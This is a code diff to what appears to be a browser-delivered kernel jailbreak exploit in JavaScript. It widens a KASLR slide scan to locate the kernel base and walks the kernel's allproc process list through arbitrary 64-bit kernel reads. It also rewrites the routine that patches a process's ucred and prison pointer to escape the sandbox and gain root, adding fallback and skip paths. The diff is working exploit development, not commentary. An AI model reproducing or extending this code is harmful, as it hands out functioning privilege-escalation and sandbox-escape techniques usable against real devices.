@@ -118,7 +118,7 @@ html, body {
 // ========== SHARED CONFIG ==========
 var Q = new URLSearchParams(location.search);
 
-var REVISION = "genuine-u8-rw-8-1352";
+var REVISION = "genuine-u8-rw-9-1352";
 var headerMsg = "mansoor0x";
 
 var MAX_ATTEMPTS = (function(){
@@ -223,6 +223,7 @@ var TAG_MAP = {
     "PROC-HARVEST":       ["KEXPLOIT", "info"],
     "ALLPROC-WALK":       ["KEXPLOIT", "info"],
     "ALLPROC-TRY":        ["KEXPLOIT", "run"],
+    "KSCAN-SKIP":         ["KEXPLOIT", "info"],
     "PRISON0":            ["KEXPLOIT", "info"],
     "KBASE-SRC":          ["KEXPLOIT", "info"],
     "KBASE-FOUND":        ["KEXPLOIT", "info"],
@@ -482,7 +483,7 @@ function kptrBig(v) {
 }
 
 var KBASE_DEFAULT = 0xffffffff80000000n;
-var KBASE_SLIDE_MAX = 0x2800000n;
+var KBASE_SLIDE_MAX = 0x4000000n;
 
 function parseKernelBaseString(raw) {
     if (!raw) return null;
@@ -539,51 +540,76 @@ function probeKernelBaseLoose(kbase, sysentOff) {
 function enumerateAllproc(kbase, allprocOff, max) {
     var out = [];
     if (!allprocOff) return out;
-    try {
-        var cur = read64(kbase + BigInt(allprocOff));
-        if (!kptrBig(cur)) return out;
+    var seen = Object.create(null);
+    function walkFrom(cur) {
+        if (!kptrBig(cur) || seen[cur.toString(16)]) return;
         var head = cur;
         for (var i = 0; i < max; i++) {
+            var key = cur.toString(16);
+            if (seen[key]) break;
+            seen[key] = 1;
             out.push(cur);
             var next = read64(cur);
             if (!kptrBig(next) || next === cur) break;
+            if ((next & 0xFFFFF00000000000n) !== 0xFFFFFFFF00000000n) break;
             cur = next;
             if (cur === head) break;
         }
+    }
+    try {
+        var slot = kbase + BigInt(allprocOff);
+        var p0 = read64(slot);
+        walkFrom(p0);
+        if (kptrBig(p0)) walkFrom(read64(p0));
     } catch (_) {}
     return out;
+}
+
+function finishKbaseResolve(kb, sysentOff, prison0Off, tag) {
+    var strict = probeKernelBase(kb, sysentOff, prison0Off);
+    var loose = probeKernelBaseLoose(kb, sysentOff);
+    mark("KBASE-FOUND", hex(kb) + "-" + tag + "-loose=" + loose + "-strict=" + strict);
+    return { kb: kb, strict: strict, loose: loose };
 }
 
 function resolveKernelBaseAsync(sysentOff, prison0Off, done) {
     if (Q.get("kb")) {
         var qk = kernelBaseFromQuery();
         mark("KBASE-SRC", "query");
-        done(qk, probeKernelBase(qk, sysentOff, prison0Off));
+        var r = finishKbaseResolve(qk, sysentOff, prison0Off, "query");
+        done(r.kb, r.strict || r.loose);
         return;
     }
     var stored = kernelBaseFromStorage();
-    if (stored !== null && probeKernelBase(stored, sysentOff, prison0Off)) {
+    if (stored !== null && probeKernelBaseLoose(stored, sysentOff)) {
         mark("KBASE-SRC", "storage");
-        done(stored, true);
+        var rs = finishKbaseResolve(stored, sysentOff, prison0Off, "storage");
+        done(rs.kb, rs.strict || rs.loose);
         return;
     }
-    mark("KBASE-SRC", "slide-scan");
+    if (probeKernelBaseLoose(KBASE_DEFAULT, sysentOff)) {
+        mark("KBASE-SRC", "default-loose");
+        var rd = finishKbaseResolve(KBASE_DEFAULT, sysentOff, prison0Off, "default");
+        done(rd.kb, rd.strict || rd.loose);
+        return;
+    }
+    mark("KBASE-SRC", "slide-scan-loose");
     var slide = 0n;
     function chunk() {
-        var end = slide + 0x80000n;
+        var end = slide + 0x100000n;
         if (end > KBASE_SLIDE_MAX) end = KBASE_SLIDE_MAX;
         for (; slide < end; slide += 0x4000n) {
             var kb = KBASE_DEFAULT + slide;
-            if (probeKernelBase(kb, sysentOff, prison0Off)) {
-                mark("KBASE-FOUND", hex(kb) + "-slide=" + hex(slide));
-                done(kb, true);
+            if (probeKernelBaseLoose(kb, sysentOff)) {
+                var rf = finishKbaseResolve(kb, sysentOff, prison0Off, "slide=" + hex(slide));
+                done(rf.kb, rf.strict || rf.loose);
                 return;
             }
         }
         if (slide < KBASE_SLIDE_MAX) setTimeout(chunk, 0);
         else {
             mark("KBASE-FOUND", "none");
-            mark("KBASE-WARN", "unverified-default-" + hex(KBASE_DEFAULT));
+            mark("KBASE-WARN", "no-loose-sysent-match-use-kb=0x...");
             done(KBASE_DEFAULT, false);
         }
     }
@@ -1467,34 +1493,19 @@ function runJailbreak() {
                 setTimeout(startMarkerScan, 0);
                 return;
             }
-            mark("ALLPROC-TRY", "idx=" + allprocIdx + "/" + allprocList.length);
-            var end = Math.min(allprocIdx + 3, allprocList.length);
-            for (; allprocIdx < end; allprocIdx++) {
-                proc = allprocList[allprocIdx];
-                procResolved = true;
-                if (tryDirectUcredOnProc()) {
-                    mark("SANDBOX-ESCAPE", "success-allproc-direct");
-                    setTimeout(finalizeJailbreak, 0);
-                    return;
-                }
-                var off = 0;
-                for (; off < 0x4000; off += 8) {
-                    var candidate = read64(proc + BigInt(off));
-                    if ((candidate & 0xFFFFFFFFn) !== 0x726f7272n) continue;
-                    hits++;
-                    var ucred = read64(proc + BigInt(off - 0x40));
-                    if (!kptrBig(ucred)) continue;
-                    if (patchAndVerifyUcred(ucred, prisonVal)) {
-                        sandboxEscaped = true;
-                        mark("SANDBOX-ESCAPE", "success-allproc-rror");
-                        mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
-                        setTimeout(finalizeJailbreak, 0);
-                        return;
-                    }
-                }
+            if (allprocIdx >= allprocList.length) {
+                setTimeout(startMarkerScan, 0);
+                return;
             }
-            if (allprocIdx < allprocList.length) setTimeout(tryAllprocEscapeChunk, 0);
-            else setTimeout(startMarkerScan, 0);
+            mark("ALLPROC-TRY", "idx=" + allprocIdx + "/" + allprocList.length);
+            proc = allprocList[allprocIdx++];
+            procResolved = true;
+            if (tryDirectUcredOnProc()) {
+                mark("SANDBOX-ESCAPE", "success-allproc-direct");
+                setTimeout(finalizeJailbreak, 0);
+                return;
+            }
+            setTimeout(tryAllprocEscapeChunk, 0);
         } catch (error) {
             try { restoreSysent(); } catch (_) {}
             mark("JAILBREAK-ERROR", error.message);
@@ -1502,7 +1513,14 @@ function runJailbreak() {
     }
 
     function startMarkerScan() {
-        compactLog(40);
+        compactLog(32);
+        var kbaseOk = probeKernelBaseLoose(kbase, sysent);
+        if (!kbaseOk || (allprocList.length === 0 && procCandidates.length <= 2)) {
+            mark("KSCAN-SKIP", "kbase-loose=" + kbaseOk + "-allproc=" + allprocList.length + "-cand=" + procCandidates.length);
+            mark("SANDBOX-ESCAPE", "FAILED-no-kbase-or-allproc-set-kb=0x...");
+            setTimeout(finalizeJailbreak, 0);
+            return;
+        }
         mark("KSCAN-BEGIN", "candidates=" + procCandidates.length);
         procCandIdx = 0;
         procResolved = false;
